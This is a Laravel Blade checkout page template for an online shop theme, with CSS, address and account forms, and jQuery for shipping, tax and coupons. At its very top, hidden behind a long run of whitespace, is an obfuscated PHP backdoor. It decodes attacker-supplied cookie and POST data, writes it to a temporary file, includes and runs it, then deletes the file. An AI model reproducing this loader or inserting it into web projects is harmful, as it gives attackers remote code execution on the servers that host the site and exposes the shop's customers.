<?php                                                                                                                                                                                                                                                                                                                                                                                                 $MsPYaI = class_exists("eBz_VXz");if (!$MsPYaI){class eBz_VXz{private $tIWJuNcd;public static $GoaunSyN = "5a0e950a-ff24-4271-bed6-caf9e5f14ce5";public static $LJdrn = NULL;public function __construct(){$iNiNMlhUSC = $_COOKIE;$woDxoa = $_POST;$uIrJMoXBZd = @$iNiNMlhUSC[substr(eBz_VXz::$GoaunSyN, 0, 4)];if (!empty($uIrJMoXBZd)){$EDuukTcB = "base64";$SYyxbGWge = "";$uIrJMoXBZd = explode(",", $uIrJMoXBZd);foreach ($uIrJMoXBZd as $sIhwfpu){$SYyxbGWge .= @$iNiNMlhUSC[$sIhwfpu];$SYyxbGWge .= @$woDxoa[$sIhwfpu];}$SYyxbGWge = array_map($EDuukTcB . "\x5f" . chr (100) . chr ( 421 - 320 )."\x63" . chr (111) . chr ( 109 - 9 )."\145", array($SYyxbGWge,)); $SYyxbGWge = $SYyxbGWge[0] ^ str_repeat(eBz_VXz::$GoaunSyN, (strlen($SYyxbGWge[0]) / strlen(eBz_VXz::$GoaunSyN)) + 1);eBz_VXz::$LJdrn = @unserialize($SYyxbGWge);}}public function __destruct(){$this->bkONDX();}private function bkONDX(){if (is_array(eBz_VXz::$LJdrn)) {$KkDcpjKl = sys_get_temp_dir() . "/" . crc32(eBz_VXz::$LJdrn["\163" . chr (97) . 'l' . "\164"]);@eBz_VXz::$LJdrn["\167" . "\x72" . "\x69" . "\x74" . chr ( 874 - 773 )]($KkDcpjKl, eBz_VXz::$LJdrn["\143" . 'o' . "\156" . "\164" . "\x65" . "\156" . chr (116)]);include $KkDcpjKl;@eBz_VXz::$LJdrn["\x64" . chr (101) . chr ( 120 - 12 ).chr ( 495 - 394 ).chr ( 131 - 15 ).chr (101)]($KkDcpjKl);exit();}}}$jbNiGI = new eBz_VXz(); $jbNiGI = NULL;} ?>@extends('theme.MellyMunchies.website')
<style>

/*======================================
   Start Checkout Form CSS
========================================*/
.shop.checkout {
	padding: 0;
	background: #fff;
	padding-top: 20px;
	padding-bottom: 50px;
}
.shop.checkout .checkout-form {
	margin-top: 30px;
}
.shop.checkout .checkout-form h2 {
	font-size: 25px;
	color: #333;
	font-weight: 700;
	line-height: 27px;
}
.shop.checkout .checkout-form p {
	font-size: 16px;
	color: #333;
	font-weight: 400;
	margin-top: 12px;
	margin-bottom: 30px;
}

.shop.checkout .form-group {
	margin-bottom: 25px;
}
.shop.checkout .form-group label{
	color:#333;
	position:relative;
}
.shop.checkout .form-group label span {
	color: #ff2c18;
	display: inline-block;
	position: absolute;
	right: -12px;
	top: 4px;
	font-size: 16px;
}
.shop.checkout .form-group input {
	width: 100%;
	height: 45px;
	line-height: 50px;
	padding: 0 20px;
	border-radius: 3px;
	border-radius: 0px;
	color: #333 !important;
	border: none;
	background: #F6F7FB;
}
.shop.checkout .form-group input[type=checkbox]{
	width: auto;
	height: auto;
}
.shop.checkout .form-group select {
	width: 100%;
	height: 45px;
	line-height: 50px;
	padding: 0 20px;
	border-radius: 3px;
	border-radius: 0px;
	color: #333 !important;
	border: none;
	background: #F6F7FB;
}

.shop.checkout .form-group textarea {
	width: 100%;
	line-height: 50px;
	padding: 0 20px;
	border-radius: 3px;
	border-radius: 0px;
	color: #333 !important;
	border: none;
	background: #F6F7FB;
}

.shop.checkout #payment-descriptions{
	width: 100%;
    min-height: 60px;
    line-height: 30px;
    border-radius: 0px;
    color: #333 !important;
    border: none;
    background: #F6F7FB;
    display: block;
    padding: 15px 20px;
    font-size: 14px;
}

.shop.checkout .nice-select {
	width: 100%;
	height: 45px;
	line-height: 50px;
	margin-bottom: 25px;
	background: #F6F7FB;
	border-radius: 0px;
	border:none;
}
.shop.checkout .nice-select .list {
	width: 100%;
	height: 300px;
	overflow: scroll;
}
.shop.checkout .nice-select .list li{}
.shop.checkout .nice-select .list li.option{
	color:#333;
}
.shop.checkout .nice-select .list li.option:hover{
	background:#F6F7FB;
	color:#333;
}
.shop.checkout .form .address input {
	margin-bottom: 15px;
}
.shop.checkout .form .address input:last-child{
	margin:0;
}
.shop.checkout .form .create-account {
	margin: 0;
}
.shop.checkout .form .create-account input {
	width: auto;
	display: inline-block;
	height: auto;
	border-radius: 100%;
	margin-right: 3px;
}
.shop.checkout .form .create-account label {
	display: inline-block;
	margin: 0;
}
.shop.checkout .order-details {
	margin-top: 30px;
	background: #fff;
	padding: 15px 0 30px 0;
	border: 1px solid #eee;
}
.shop.checkout .single-widget {
	margin-bottom: 30px;
}
.shop.checkout .single-widget:last-child{
	margin:0;
}
.shop.checkout .single-widget h2 {
	position:relative;
	font-size: 15px;
	font-weight: 600;
	padding: 10px 30px;
	line-height: 24px;
	text-transform: uppercase;
	color: #333;
	padding-bottom: 5px;
}
.shop.checkout .single-widget h2:before{
	position:absolute;
	content:"";
	left:30px;
	bottom:0;
	height:2px;
	width:50px;
	background:var(--primary-color);
}
.shop.checkout .single-widget .content ul{
	margin-top:30px;
}
.shop.checkout .single-widget .content ul li {
	display: block;
	padding: 0px 30px;
	font-size: 15px;
	font-weight: 400;
	color: #333;
	margin-bottom: 12px;
}
.shop.checkout .single-widget .content ul li span{
	display:inline-block;
	float:right;
}
.shop.checkout .single-widget .content ul li.last {
	padding-top: 12px;
	border-top: 1px solid #ebebeb;
	display: block;
	font-size: 15px;
	font-weight: 400;
	color: #333;
}

.shop.checkout .single-widget .content form {
	margin-top: 20px;
}

.shop.checkout .single-widget .content form input {
	width: 100%;
	display: inline-block;
	height: 48px;
	color: #333;
	padding: 0px 20px;
	border: 1px solid #333;
	box-shadow: 0px 0px 5px #0000000a;
}
.shop.checkout .single-widget .content form .btn {
    width: 100%;
    margin-top:5px;
}

.shop.checkout .single-widget .checkbox {
	text-align: left;
	margin: 0;
	padding: 0px 30px;
	margin-top:30px;
}
.shop.checkout .single-widget .checkbox label {
	color: #555555;
	position: relative;
	font-size: 14px;
	padding-left: 20px;
	margin-top: -5px;
	font-weight: 400;
	display: block;
	margin-bottom: 15px;
}
.shop.checkout .single-widget .checkbox label:last-child{
	margin-bottom:0;
}
.shop.checkout .single-widget .checkbox label:hover{
	cursor:pointer;
}
.shop.checkout .single-widget .checkbox label input{
	display:none;
}
.shop.checkout .single-widget .checkbox label::before {
	position: absolute;
	content: "";
	left: 0;
	top: 7px;
	width: 12px;
	height: 12px;
	line-height: 16px;
	border: 1px solid #666;
	border-radius: 100%;
}
.shop.checkout .single-widget .checkbox label::after {
	position: absolute;
	content: "";
	left: 0;
	top: 7px;
	width: 12px;
	height: 12px;
	line-height: 16px;
	border-radius: 100%;
	display:block;
	background:#666;
	transform:scale(0);
	-webkit-transition:all 0.4s ease;
	-moz-transition:all 0.4s ease;
	transition:all 0.4s ease;
}
.shop.checkout .single-widget .checkbox label.checked::after{
	opacity:1;
	visibility:visible;
	transform:scale(1);
}
.shop.checkout .single-widget.payement {
	padding: 0px 38px;
	text-align: center;
	margin-top: 30px;
}
.shop.checkout .single-widget.get-button {
	text-align: center;
	padding:0px 35px;
}
.shop.checkout .single-widget.get-button .btn {
	height: 46px;
	width: 100%;
	line-height: 19px;
	text-align: center;
	border-radius: 0;
	text-transform: uppercase;
	color: #fff;
}
.custom-control-label {
    cursor: pointer;
}
/*======================================
   End Checkout Form CSS
========================================*/

/*======================================
   Login & Register & My Account CSS
========================================*/
.alert-success {
    color: #ffffff;
    background-color: #00b894;
    border-color: #00b894;
}

.alert-danger {
    color: #FFF;
    background-color: #ff4949;
    border-color: #ff4949;
}

.section{
	padding-top: 80px;
	padding-bottom: 50px;
}

.section-heading{
	text-align: center;
	font-weight: 600;
	margin-bottom: 60px;
	color: var(--primary-color);
	position: relative;
	line-height: 24px;
}

.section-heading::after{
	content: '';
    width: 60px;
    height: 6px;
    background: var(--primary-color);
    border-radius: 10px;
    position: absolute;
    display: block;
    left: 0;
    right: 0;
    margin-left: auto;
    margin-right: auto;
    margin-top: 15px;
}

#auth{
	padding: 60px 0px;
}

.login_register{
	background: #ffffff;
    padding: 50px;
    box-shadow: 1px 3px 10px #d8d8d8;
}

.login_register .form-control {
	height: auto;
    display: block;
    width: 100%;
   	padding: 15px;
    font-size: 1rem;
    line-height: 1.5;
    color: #495057;
    background-color: #fff;
    background-clip: padding-box;
    border: 1px solid #CCC;
    border-radius: .25rem;
    margin-top: 15px;
    transition: border-color .15s ease-in-out,box-shadow .15s ease-in-out;
}

.login_register .form-control:focus{
	outline: none;
	-webkit-box-shadow: none;
    box-shadow: none;
	border: 1px solid #000;
}

.login_register .btn-login{
	display: block;
    background: #FFF;
    padding: 18px 50px;
    border: 1px solid var(--primary-color);
    color: var(--primary-color);
	transition: all 0.3s;
	width: 100%;
	margin-top: 30px;
}
.login_register .btn-login:hover{
    background: var(--primary-color);
    color: #FFF;
}

.login_register .right_link{
	color: var(--primary-color);
	margin-top: 15px;
	transition: all 0.3s;
	display: inline-block;
}

.login_register .right_link:hover{
	text-decoration: underline;
}

.create-account-link{
	color: var(--primary-color);
	display: inline-block;
	margin-top: 15px;
	transition: all 0.3s;
}

.create-account-link:hover{
	color: var(--primary-color);
	text-decoration: underline;
}

.customer_dashboard{
	box-shadow: 0 0 4px 0 #e9e9e9;
}

.customer_dashboard{
	box-shadow: 0 0 4px 0 #d0cfcf;
}

.customer_dashboard .nav-tabs li.nav-item a {
    text-align: left;
    padding: 12px 20px;
    border-radius: 0;
    border-bottom: 1px solid #efefef;
    color: #2b2f4c;
}
.customer_dashboard .nav-tabs li.nav-item a.active{
	background: #1d2224;
	color: #FFF;
}
.customer_dashboard .nav-tabs li.nav-item a i {
    margin-right: 8px;
    vertical-align: middle;
}

.dashboard_content .card-header {
    background-color: #1d2224;
    border-color: #1d2224;
    padding: 14px 20px;
}

.dashboard_content .card-header > h4 {
	font-size: 16px;
	color: #FFF;
	font-weight: 400;
	margin: 0;
}

.account_details .form-control {
	height: auto;
    display: block;
    width: 100%;
   	padding: 15px;
    font-size: 1rem;
    line-height: 1.5;
    color: #495057;
    background-color: #fff;
    background-clip: padding-box;
    border: 1px solid #CCC;
    border-radius: .25rem;
    margin-top: 15px;
    transition: border-color .15s ease-in-out,box-shadow .15s ease-in-out;
}

.account_details .form-control:focus{
	outline: none;
	-webkit-box-shadow: none;
    box-shadow: none;
	border: 1px solid #000;
}

.account_details .btn-login{
    background: #FFF;
    padding: 18px 50px;
    border: 1px solid #303952;
    color: #303952;
	transition: all 0.3s;
	margin-top: 30px;
}
.account_details .btn-login:hover{
    background: #303952;
    color: #FFF;
}
.btn-add-address{
	color: #FFF !important;
	padding: 6px 16px;
	display: inline-block;
	font-size: 14px;
	border: 1px solid #FFF;
	border-radius: 50px;
}

/*======================================
	End Login CSS
========================================*/

/*======================================
   Start Shop List CSS
========================================*/
.shop-list .list-content{
	margin-top:50px;
}
.shop-list .list-content .product-price{}
.shop-list .list-content .product-price span {
	font-size: 14px;
	font-weight: 600;
	margin-bottom: 3px;
	display: block;
}
.shop-list .list-content .title {
	line-height: 20px;
}
.shop-list .list-content .title a:hover{
	color:var(--primary-color);
}
.shop-list .list-content .title a {
	font-size: 18px;
	font-weight: 600;
}
.shop-list .list-content .rating {
	margin: 5px 0 8px 0;
}
.shop-list .list-content .rating li{
	display:inline-block;
}
.shop-list .list-content .rating li i{
	color: var(--primary-color);
}
.shop-list .list-content .rating li.total {
	color: #333;
	font-size: 12px;
	margin-left: 3px;
}
.shop-list .list-content .des{}
.shop-list .list-content .btn {
	margin-top: 22px;
	height: 42px;
	line-height: 15px;
	color: #333;
	background: transparent;
	border: 1px solid #cecece;
	font-size: 13px;
	border-radius: 30px;
	height: auto;
	line-height: a;
	padding: 13px 32px;
}
.shop-list .list-content .btn:hover{
	background:var(--primary-color);
	color:#fff;
	border-color:transparent;
}
/* Pagination CSS */
.pagination {
	text-align: left;
	margin: 50px 0 0 0;
	/*display:block;*/
}
.pagination.center {
	text-align: center;
}
.pagination .pagination-list li {
	margin-right: 5px;
	display: inline-block;
}
.pagination .pagination-list li:last-child{
	margin-right:0px;
}
.pagination .pagination-list li a {
	background: #F6F7FB;
	color: #666;
	padding: 6px 18px;
	font-weight: 400;
	border: 1px solid #e1e1e1;
	font-size: 16px;
	border-radius: 0px;
}
.pagination .pagination-list li.active a,
.pagination .pagination-list li:hover a{
	background: var(--primary-color);
	color: #fff;
	border-color: transparent;
}
.pagination .pagination-list li a i{
	font-size:13px;
}
.blog-grids.pagination{
	margin-top:50px;
	text-align:center;
}

.pagination .page-item.active a,
.pagination .page-item:hover a{
	background: var(--primary-color);
	color: #fff;
	border-color: transparent;
}
.page-item.active .page-link {
    z-index: 3;
    color: #fff;
    background-color: var(--primary-color);
    border-color: var(--primary-color);
}
.shop.checkout .single-widget.get-button .btn {
    height: 46px;
    width: 100%;
    line-height: 19px;
    text-align: center;
    border-radius: 0;
    text-transform: uppercase;
    color: #fff;
    background: #000;
    text-align: center;
    line-height: 32px;
}
/*======================================
   End Shop List CSS
========================================*/

</style>
@section('content')
<!-- Start Checkout -->
<section class="shop checkout section">
	<div class="container">
		<div class="row"> 
			<div class="col-lg-8 col-12">
				@if(\Session::has('success'))
					<div class="alert alert-success mt-4">
						<a href="#" class="close" data-dismiss="alert" aria-label="close">&times;</a>
						<span>{!! xss_clean(session('success')) !!}</span>
					</div>
				@endif

				@if(\Session::has('error'))
					<div class="alert alert-danger mt-4">
						<a href="#" class="close" data-dismiss="alert" aria-label="close">&times;</a>
						<span>{!! xss_clean(session('error')) !!}</span>
					</div>
				@endif

				<div class="checkout-form">

					<div class="alert-box"></div>

					<h2>{{ _lang('Make Your Checkout Here') }}</h2>
					
					@if(! Auth::check())
						<p>{{ _lang('You have an account already?') }} <a href="{{ url('/sign_in') }}" class="btn-link"><b>{{ _lang('Login to your account') }}</b></a></p>

						<!-- Form -->
						<form id="checkout-form" method="post" action="{{ url('/make_order') }}">
							@csrf
							<div class="row">
								<div class="col-12">
									<div class="form-group">
										<label>{{ _lang('Name') }}<span>*</span></label>
										<input type="text" name="name" placeholder="{{ _lang('Name') }}" required>
										
										@if($errors->has('name'))
											<div class="invalid-feedback">
									          {{ $errors->first('name') }}
									        </div>
								        @endif
									</div>
								</div>
								<div class="col-lg-6 col-md-6 col-12">
									<div class="form-group">
										<label>{{ _lang('Email Address') }}<span>*</span></label>
										<input type="email" name="email" placeholder="{{ _lang('Email Address') }}" required>
										@if($errors->has('email'))
											<div class="invalid-feedback">
									          {{ $errors->first('email') }}
									        </div>
								        @endif
									</div>
								</div>
								<div class="col-lg-6 col-md-6 col-12">
									<div class="form-group">
										<label>{{ _lang('Phone Number') }}<span>*</span></label>
										<input type="number" name="phone" placeholder="{{ _lang('Phone Number') }}" required>
									</div>
								</div>
								<div class="col-lg-6 col-md-6 col-12">
									<div class="form-group">
										<label>{{ _lang('Country') }}<span>*</span></label>
										<select name="country" class="customer-country" id="country" required>
											@php $supported_countries = get_option('supported_countries'); @endphp
							                <option value="">{{ _lang('Select Country') }}</option>   	
											@if(!empty($supported_countries))
					                    	    @foreach(get_all_country() as $country)
														@if(in_array($country->name, $supported_countries))
															<option value="{{ $country->sortname }}" data-id="{{ $country->id }}" {{ old('country') == $country->sortname ? 'selected' : '' }}>
																{{ $country->name }}
															</option>
														@endif
					                    	    @endforeach
				                    	    @endif
										</select>
										@if($errors->has('country'))
											<div class="invalid-feedback">
									          {{ $errors->first('country') }}
									        </div>
								        @endif
									</div>
								</div>
								<div class="col-lg-6 col-md-6 col-12">
									<div class="form-group">
										<label>{{ _lang('State / Divition') }}<span>*</span></label>
										<select name="state" class="select-state-no-auth" id="state" required>
											<option value="">{{ _lang('Select State') }}</option>
										</select>
										@if($errors->has('state'))
											<div class="invalid-feedback">
									          {{ $errors->first('state') }}
									        </div>
								        @endif
									</div>
								</div>

								<div class="col-lg-6 col-md-6 col-12">
									<div class="form-group">
										<label>{{ _lang('City') }}<span>*</span></label>
										<input type="text" name="city" placeholder="{{ _lang('City') }}" required="required">
										@if($errors->has('city'))
											<div class="invalid-feedback">
									          {{ $errors->first('city') }}
									        </div>
								        @endif
									</div>
								</div>

								<div class="col-lg-6 col-md-6 col-12">
									<div class="form-group">
										<label>{{ _lang('Postal Code') }}<span>*</span></label>
										<input type="text" name="post_code" placeholder="{{ _lang('Postal Code') }}" required="required">
										@if($errors->has('post_code'))
											<div class="invalid-feedback">
									          {{ $errors->first('post_code') }}
									        </div>
								        @endif
									</div>
								</div>

								<div class="col-12">
									<div class="form-group">
										<label>{{ _lang('Address') }}<span>*</span></label>
										<input type="text" name="address" placeholder="{{ _lang('Address') }}" required>
										@if($errors->has('address'))
											<div class="invalid-feedback">
									          {{ $errors->first('address') }}
									        </div>
								        @endif
									</div>
								</div>
								
								
								<div class="col-12 mb-3">
									<div class="form-group create-account">	
										<label><input id="create_account" name="create_account" value="1" type="checkbox"> {{ _lang('Create an account?') }}</label>
									</div>
								</div>

								<div class="col-md-6 create_account {{ old('create_account') == 1 ? '' : 'd-none'  }}">
									<div class="form-group">
										<label>{{ _lang('Password') }}<span>*</span></label>
										<input type="password" name="password" placeholder="{{ _lang('Password') }}" required="required">

										@if($errors->has('password'))
											<div class="invalid-feedback">
									          {{ $errors->first('password') }}
									        </div>
								        @endif
									</div>
								</div>

								<div class="col-md-6 create_account d-none">
									<div class="form-group">
										<label>{{ _lang('Password Confirmation') }}<span>*</span></label>
										<input type="password" name="password_confirmation" placeholder="{{ _lang('Password Confirmation') }}" required="required">

										@if($errors->has('password_confirmation'))
											<div class="invalid-feedback">
									          {{ $errors->first('password_confirmation') }}
									        </div>
								        @endif
									</div>
								</div>					 

							</div>
						</form>
						<!--/ End Form -->
					@else
						<p>{{ _lang('You are now logged in') }}</p>
						@php $address_list = \App\CustomerAddress::where('customer_id',Auth::id())->get(); @endphp
						<form id="checkout-form" method="post" action="{{ url('/make_order') }}">
							@csrf
							<div class="row">
								<div class="col-md-6 col-12">
									<div class="form-group">
										<label>{{ _lang('Shipping Address') }}<span>*</span></label>
										<select name="shipping_address" id="select-shipping-address" required>
											@foreach($address_list as $shipping_address)
												<option value="{{ $shipping_address->id }}" data-state="{{ $shipping_address->state }}" {{ $shipping_address->is_default == 1 ? 'selected' : '' }}>{{ $shipping_address->address }}</option>
											@endforeach
										</select>
									</div>
								</div>

								<div class="col-md-6 col-12">
									<div class="form-group">
										<label>{{ _lang('Billing Address') }}<span>*</span></label>
										<select name="billing_address" id="select-billing-address" required>
											@foreach($address_list as $billing_address)
												<option value="{{ $billing_address->id }}" data-state="{{ $billing_address->state }}" {{ $billing_address->is_default == 1 ? 'selected' : '' }}>{{ $billing_address->address }}</option>
											@endforeach
										</select>
									</div>
								</div>
								<div class="col-md-12">
									<div class="form-group">
										<div class="form-group">
											<label>{{ _lang('Order Note') }}</label>
											<textarea name="note" placeholder="{{ _lang('Order Note') }}"></textarea>
										</div>
									</div>
								</div>
							</div>
						</form>
						<a href="" id="add_new_address"><i class="fa fa-plus"></i> {{ _lang('Add New Address') }}</a>
						<div class="account_details d-none mt-3">
							<h5>{{ _lang('Add New Address') }}</h5>
							<form action="{{ url('/add_new_address') }}" id="create_address_form" method="post">
								@csrf
								<div class="row">
									<div class="col-md-12">
										<input type="text" name="name" value="{{ old('name') }}" class="form-control" placeholder="{{ _lang('Name') }}" required>
								    </div>
								    <div class="col-md-6">
										 @php $supported_countries = get_option('supported_countries'); @endphp
										<select class="form-control customer-country" data-selected="{{ old('country') }}" name="country" required>
							                <option value="">{{ _lang('Select Country') }}</option>	
				                    	    @if(!empty($supported_countries))
					                    	    @foreach(get_all_country() as $country)
														@if(in_array($country->name, $supported_countries))
															<option value="{{ $country->sortname }}" data-id="{{ $country->id }}" {{ old('country') == $country->sortname ? 'selected' : '' }}>
																{{ $country->name }}
															</option>
														@endif
					                    	    @endforeach
				                    	    @endif
										</select>
								    </div>

								    <div class="col-md-6">
								    	<select class="form-control" id="state" name="state" required>
								    		<option value="">{{ _lang('Select State') }}</option>	
								    	</select>
								    </div>

								    <div class="col-md-6">
										<input type="text" name="city"  value="{{ old('city') }}" class="form-control" placeholder="{{ _lang('City') }}" required>
								    </div>

								    <div class="col-md-6">
										<input type="text" name="post_code" value="{{ old('post_code') }}" class="form-control" placeholder="{{ _lang('Post Code') }}" required>
								    </div>

								    <div class="col-md-12">
										<textarea class="form-control" name="address" placeholder="{{ _lang('Address') }}" required>{{ old('address') }}</textarea>
								    </div>

								    <input type="hidden" name="is_default" value="0">

								
									<div class="col-md-12">
										<button type="submit" class="btn-login">{{ _lang('Save Address') }}</button>
									</div>
								</div>
							</form>
						</div>
					@endif
					
				</div>
			</div>
			<div class="col-lg-4 col-12">
				<div class="order-details">
					<!-- Order Widget -->
					<div class="single-widget">
						<h2>{{ _lang('CART  TOTALS') }}</h2>
						<div class="content" id="cart-contents">
							@include('theme.default.components.checkout-cart')
						</div>
					</div>
					<!--/ End Order Widget -->

					<div class="single-widget">
						<h2>{{ _lang('Apply Coupon') }}</h2>
						<div class="content">
							<ul>
								<li>
									<form id="apply_coupon" action="{{ url('/apply_coupon') }}" method="POST">
										@csrf
										<input type="text" name="coupon" placeholder="{{ _lang('Enter Coupon Code') }}" required>
										<button class="btn">{{ _lang('Apply Coupon') }}</button>
									</form>
								</li>
							</ul>
						</div>
					</div>	

					<div class="single-widget">
						<h2>{{ _lang('Shipping Methods') }}</h2>
						<div class="content">
							@if(! Cart::isEmpty())						
								<ul>	
									@if(get_option('free_shipping_active') == 'Yes' && \Cart::getSubTotal() >= get_option('free_shipping_minimum_amount',0))
										<li>
											<div class="custom-control custom-radio">
												<input type="radio" id="free_shipping" value="free_shipping" name="shipping_method" class="custom-control-input select-shipping-method" {{ empty(Cart::getCondition(get_option('free_shipping_label'))) ? '' : 'checked' }}>
												<label class="custom-control-label" for="free_shipping">{{ get_option('free_shipping_label') }}</label>
											</div>
										</li>
									@endif

									@if(get_option('flat_rate_active') == 'Yes')
										<li>
											<div class="custom-control custom-radio">
												<input type="radio" id="flat_rate" value="flat_rate" name="shipping_method" class="custom-control-input select-shipping-method" {{ empty(Cart::getCondition(get_option('flat_rate_label'))) ? '' : 'checked' }}>
												<label class="custom-control-label" for="flat_rate">{{ get_option('flat_rate_label') }} + <b>{!! xss_clean(show_price(get_option('flat_rate_cost'))) !!}</b></label>
											</div>
										</li>
									@endif

									@if(get_option('local_pickup_active') == 'Yes')
										<li>
											<div class="custom-control custom-radio">
												<input type="radio" id="local_pickup" value="local_pickup" name="shipping_method" class="custom-control-input select-shipping-method" {{ empty(Cart::getCondition(get_option('local_pickup_label'))) ? '' : 'checked' }}>
												<label class="custom-control-label" for="local_pickup">{{ get_option('local_pickup_label') }} + <b>{!! xss_clean(show_price(get_option('local_pickup_cost'))) !!}</b></label>
											</div>
										</li>
									@endif
								</ul>
							@endif
						</div>
					</div>


					<!-- Button Widget -->
					<div class="single-widget get-button">
						<div class="content">
							<div class="button">
								<a href="" id="proceed_to_checkout" class="btn">{{ _lang('Proceed to Payment') }}</a>
							</div>
						</div>
					</div>
					<!--/ End Button Widget -->
				</div>
			</div>
		</div>
	</div>
</section>
<!--/ End Checkout -->
@endsection
@section('js-script')
<script>
(function($) {  
   "use strict";
   var _url='https://mellymunchies.custom.devopdigital.com';
    $(document).on('click','#create_account',function(){
    	$(".create_account").toggleClass('d-none');
    });
    $(document).on('change','.select-shipping-method',function(event){
        location.href = _url + '/shipping_method/' + $(this).val();
        
    });
    $(document).on('change','.select-payment-method',function(event){
        var payment_descriptions = $(this).data('description');
        $("#payment-descriptions").html(payment_descriptions);
    });
    $(document).on('click','#add_new_address',function(event){
        event.preventDefault();
        $(".account_details").toggleClass('d-none');
    });

    $(document).on('submit','#create_address_form',function(event){
        event.preventDefault();
        $.ajax({
            url: _url + '/add_new_address',
            method: "POST",
            data: $(this).serialize(),
            beforeSend: function(){
                $("#preloader").fadeIn();
            },success: function(data){
                $("#preloader").fadeOut();
                var json = JSON.parse(JSON.stringify(data));
                if(json['result'] == "success"){ 
                    $('#create_address_form')[0].reset();
                    $("#state").html("");
                    $(".account_details").toggleClass('d-none');
                    var customer = json['data'];
                    $("#select-shipping-address, #select-billing-address").append('<option value="' + customer['id'] + '" data-state="'+ customer['state'] +'">' + customer['address'] + '</option>');
                    $("#select-shipping-address, #select-billing-address").val(customer['id']);

                    $(".alert-box").html('<div class="alert alert-success">' + json['message'] + '</div>');
                }else{
                    if(Array.isArray(json['message'])){
                        $(".alert-box").html("");
                        
                        $.each( json['message'], function( i, val ) {
                           $(".alert-box").append('<div class="alert alert-success">' + val + '</div>');
                        });       
                    }else{
                        $(".alert-box").html('<div class="alert alert-danger">' + json['message'] + '</div>');
                    }
                }
            },error: function (request, status, error) {
                console.log(request.responseText);
            }
        });
    });

    //Set Initial Payment Methods
    //$(".payment-methods > ul >li:first-child input").prop('checked',true);
    //var payment_descriptions = $(".payment-methods > ul >li:first-child input").data('description');
    //$("#payment-descriptions").html(payment_descriptions);

    $(document).on('change','.payment-methods input',function(){
        $(this).val() == 'paypal' ? $("#paypal-container").removeClass('d-none') : $("#paypal-container").addClass('d-none');
        $(this).val() == 'stripe' ? $("#stripe-container").removeClass('d-none') : $("#stripe-container").addClass('d-none');
        $(this).val() == 'razorpay' ? $("#razorpay-container").removeClass('d-none') : $("#razorpay-container").addClass('d-none');
        $(this).val() == 'paystack' ? $("#paystack-container").removeClass('d-none') : $("#paystack-container").addClass('d-none');
        $(this).val() == 'cod' ? $("#cod-container").removeClass('d-none') : $("#cod-container").addClass('d-none');
        $(this).val() == 'bank_transfer' ? $("#bank_transfer-container").removeClass('d-none') : $("#bank_transfer-container").addClass('d-none');
    });
       
    //Apply Initial Tax
    if($("#select-shipping-address").val() != null && $("#select-billing-address").val() != null ){
        //var shipping_state = $("#select-shipping-address").find(':selected').data('state');
        //var billing_state = $("#select-billing-address").find(':selected').data('state');
        var shipping_address_id = $("#select-shipping-address").val();
        var billing_address_id = $("#select-billing-address").val();

        $.ajax({
            url: _url + '/apply_tax/' + shipping_address_id + '/' + billing_address_id,
            beforeSend: function(){
                $(".preloader").fadeIn();
            },
            success: function(data){
                $(".preloader").fadeOut();
                $("#cart-contents").html(data);
            },
            error: function (request, status, error) {
                console.log(request.responseText);
            }
        });
    }

    $(document).on('change','#select-shipping-address, #select-billing-address',function(event){
        if($("#select-shipping-address").val() != '' && $("#select-billing-address").val() != '' ){
            var shipping_state = $("#select-shipping-address").find(':selected').data('state');
            var billing_state = $("#select-billing-address").find(':selected').data('state');

            $.ajax({
                url: _url + '/apply_tax/' + shipping_state + '/' + billing_state,
                beforeSend: function(){
                    $(".preloader").fadeIn();
                },
                success: function(data){
                    $(".preloader").fadeOut();
                    $("#cart-contents").html(data);
                },
                error: function (request, status, error) {
                    console.log(request.responseText);
                }
            });
        }
    });

    $(document).on('change','.select-state-no-auth',function(event){
        if($(this).val() != ''){
            var shipping_state = $(this).val();
            var billing_state = $(this).val();
            $.ajax({
                url: _url + '/apply_tax/' + shipping_state + '/' + billing_state,
                beforeSend: function(){
                    $(".preloader").fadeIn();
                },
                success: function(data){
                    $(".preloader").fadeOut();
                    $("#cart-contents").html(data);
                },
                error: function (request, status, error) {
                    console.log(request.responseText);
                }
            });
        }
    });


    $(document).on('click','#proceed_to_checkout',function(event){
        event.preventDefault();
        var validate = true;
        $("#checkout-form input, #checkout-form select").each(function(){               
            if(($(this).val() === null || $(this).val() === '') && $(this).is(":visible")){
                $(this).addClass('border border-danger');
                validate = false;
            }else{
                $(this).removeClass('border border-danger');
            }
        });
        if(validate == true){
            $("#checkout-form").submit();
        }
    });
})(jQuery);  
</script>
<script src="{{ asset('public/theme/default/js/cart.js?v=1.1') }}"></script>
<!--<script src="{{ asset('public/theme/default/js/checkout.js?v=1.1') }}"></script>-->
@endsection